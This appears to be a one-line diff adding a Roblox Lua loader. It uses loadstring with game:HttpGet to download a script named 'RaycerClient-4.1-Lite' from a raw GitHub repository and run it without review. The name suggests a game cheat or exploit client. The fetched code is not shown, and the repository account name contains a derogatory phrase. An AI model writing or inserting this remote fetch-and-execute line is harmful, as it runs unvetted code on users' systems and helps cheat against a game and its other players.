@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/10KisGay/Seppuku-Scripts/main/RaycerClient-4.1-Lite"))()
